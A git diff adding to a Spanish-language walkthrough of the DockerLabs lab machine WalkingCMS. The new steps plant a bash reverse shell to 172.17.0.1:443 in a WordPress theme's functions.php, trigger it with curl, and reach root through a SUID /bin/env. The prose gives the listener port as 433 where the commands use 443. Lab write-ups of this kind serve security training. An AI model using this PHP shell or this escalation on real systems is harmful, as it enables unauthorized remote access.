@@ -3,7 +3,7 @@
 - **Máquina:** WalkingCMS (DockerLabs)
 - **Enlace:** https://dockerlabs.es/maquinas/87/descargar
 - **Dificultad:** Fácil
-- **Fecha:** 4 de Noviembre 2026
+- **Fecha:** 5 de Noviembre 2026
 
 ---
 
@@ -130,9 +130,60 @@ Sabiendo la contraseña de **mario**, se inició sesión en en la ruta **/wordpr
 
 
 
-### 3. proximamente... 
+### 3. Reverse shell
 
-proximamente...
+Dentro de la pestaña **Apariencia > Theme Code Editor** se encuentran archivos `.php` modificables. 
+
+<img width="1363" height="476" alt="Captura de pantalla (326)" src="https://github.com/user-attachments/assets/4e7e0aa7-e8a5-47b8-9927-a3b6c401f2a0" />
+
+
+Esto permite cargar instrucciones para crear una reverse shell mediante el siguiente código, que se introdujo en el archivo **functions.php**:
+
+```bash
+ <?php
+ exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
+ ?>
+```
+
+<img width="1230" height="419" alt="Captura de pantalla (327)" src="https://github.com/user-attachments/assets/71194073-5375-49f2-a332-e67ca87f0566" />
+
+Se dejó a `netcat` escuchando en el puerto **433** antes de guardar los cambios.
+
+```bash
+$ nc -lnvp 443
+listening on [any] 443 ...
+```
+
+Para ejecutar la reverse shell se utilizó `curl` para llamar al archivo modificado y así obtener acceso remoto.
+
+
+```bash
+curl -s http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/functions.php
+```
+
+<img width="660" height="187" alt="Captura de pantalla (329)" src="https://github.com/user-attachments/assets/95ad45f5-16de-4d05-8e97-1f92f8d7f9fe" />
+
+
+### 4. Escalada de privilegios
+Al ejecutar `sudo -l` aparece el siguiente mensaje: `line 1: sudo: command not found`.
+Siendo que no existe sudo, se optó por buscar archivos con permisos **SUID**.
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+<img width="351" height="187" alt="Captura de pantalla (330)" src="https://github.com/user-attachments/assets/6dc70416-fa12-403b-896c-c3037c099284" />
+
+Se utilizó `/bin/env` para la escalada de privilegios. 
+
+```bash
+env /bin/sh -p
+```
+
+```bash
+whoami
+root
+```
 
 ---
 ## Acciones de mitigación
